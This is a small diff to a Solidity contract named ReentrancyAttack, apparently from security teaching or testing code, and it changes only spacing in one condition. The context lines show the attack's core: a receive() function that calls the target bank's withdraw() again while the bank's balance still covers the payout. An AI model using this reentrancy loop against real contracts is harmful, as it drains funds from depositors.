@@ -26,7 +26,7 @@ contract ReentrancyAttack {
     }
 
     receive() external payable {
-        if (bank.getBalance()>= PAY_AMOUNT) {
+        if (bank.getBalance() >= PAY_AMOUNT) {
             bank.withdraw();
         }
     }
